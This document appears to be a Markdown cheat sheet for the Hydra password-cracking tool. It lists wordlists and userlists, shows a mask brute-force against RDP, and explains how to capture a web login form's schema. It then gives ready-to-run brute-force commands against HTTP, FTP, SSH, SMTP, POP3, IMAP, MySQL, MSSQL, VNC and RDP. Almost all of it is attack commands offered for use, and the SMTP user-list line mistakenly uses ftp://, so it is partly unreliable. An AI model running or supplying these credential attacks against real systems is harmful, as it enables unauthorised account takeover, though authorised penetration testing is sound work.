# HYDRA

## Wordlist & Userlist

### good wordlists

> <!-- token-section:WORDLIST -->
>
>```
> - /usr/share/wordlists/rockyou.txt
>```
>```
> - /usr/share/seclists/Passwords/Common-Credentials/2023-200_most_used_passwords.txt
>```

### good userlists

> <!-- token-section:USERLIST -->
>
>```
> - /usr/share/seclists/Usernames/top-usernames-shortlist.txt
>```
>```
> - /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
>```

## Mask Attack

### Example Command

    hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 192.168.1.100 rdp

> Note:
> - 6:8 indicates a password between 6 and 8 chars
> - the letters and numbers indicate what characters are to be tried

### Command

    hydra -l <USER> -x <MIN>:<MAX>:<CHARSET> <TARGET_IP> rdp

## Web Brute Forcing

### HTTP Basic Auth

    hydra -l <USER> -P <WORDLIST> <TARGET_IP> http-get /  

### HTTP Basic Auth - Specify Port

    hydra -l <USER> -P <WORDLIST> <TARGET_IP> http-get / -s <PORT>


### Login Forms

    hydra -l <USER> -P <WORDLIST> -f <TARGET_IP> -s <PORT> http-post-form "<FORM_SCHEMA>"


### Form Schema 

> How to identify schema:
> - open login form on browser
> - open devtools, navigate to network
> - make a login attempt with test:test
> - click on the generated post request
> - identify the request endpoint under File, e.g. /login
> - click on request in the right panel and toggle on raw
> - build your login form accordingly:
> - username=test&password=test -> "/login:username=^USER^&password=^PASS^"
> - include cookies and other form data, if present
> - include a fail condition, e.g. an error response like "Invalid credentials"
> - "/login:username=^USER^&password=^PASS^:F=Invalid credentials"

## FTP 

### Fixed User

    hydra -l <USER> -P <WORDLIST> ftp://<TARGET_IP>

### User List

    hydra -L <USERLIST> -P <WORDLIST> ftp://<TARGET_IP>

## SSH 

### Fixed User

    hydra -l <USER> -P <WORDLIST> ssh://<TARGET_IP>

### User List

    hydra -L <USERLIST> -P <WORDLIST> ssh://<TARGET_IP>

## SMTP 

### Fixed User

    hydra -l <USER> -P <WORDLIST> smtp://<MAILSERVER>

### User List

    hydra -L <USERLIST> -P <WORDLIST> ftp://<MAILSERVER>

## POP3 

### Fixed User

    hydra -l <USER> -P <WORDLIST> pop3://<MAILSERVER>

### User List

    hydra -L <USERLIST> -P <WORDLIST> pop3://<MAILSERVER>

## IMAP 

### Fixed User

    hydra -l <USER> -P <WORDLIST> imap://<MAILSERVER>

### User List

    hydra -L <USERLIST> -P <WORDLIST> imap://<MAILSERVER>

## MYSQL 

### Fixed User

    hydra -l <USER> -P <WORDLIST> mysql://<TARGET_IP>

### User List

    hydra -L <USERLIST> -P <WORDLIST> mysql://<TARGET_IP>

## MSSQL 

### Fixed User

    hydra -l <USER> -P <WORDLIST> mssql://<TARGET_IP>

### User List

    hydra -L <USERLIST> -P <WORDLIST> mssql://<TARGET_IP>

## VNC 

### Fixed User

    hydra -l <USER> -P <WORDLIST> vnc://<TARGET_IP>

### User List

    hydra -L <USERLIST> -P <WORDLIST> vnc://<TARGET_IP>

## RDP 

### Fixed User

    hydra -l <USER> -P <WORDLIST> rdp://<TARGET_IP>

### User List

    hydra -L <USERLIST> -P <WORDLIST> rdp://<TARGET_IP>